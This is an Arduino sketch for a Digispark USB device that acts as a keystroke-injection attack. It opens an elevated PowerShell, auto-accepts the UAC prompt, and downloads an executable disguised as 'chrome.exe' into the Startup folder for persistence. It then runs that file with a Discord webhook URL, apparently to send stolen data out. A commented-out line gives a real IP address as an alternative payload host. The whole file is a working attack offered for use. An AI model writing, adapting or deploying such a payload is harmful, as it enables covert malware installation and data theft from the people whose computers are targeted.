#define LAYOUT_FRENCH_BELGIAN
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Start-Process powershell -Verb runAs"); //elevate to a privilegded shell
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cd \'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\\'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client.DownloadFile(\"WEBSERVER/chrome.exe\" , \"chrome.exe\")"); //filename can be anything
  //DigiKeyboard.print("$client.DownloadFile(\"http://139.144.67.55/tar.gxc\" , \"tar.gxc\")");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  
  DigiKeyboard.print("chrome.exe ");
  DigiKeyboard.print("DISCORD WEBHOOK URL");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
}

void loop() {

}
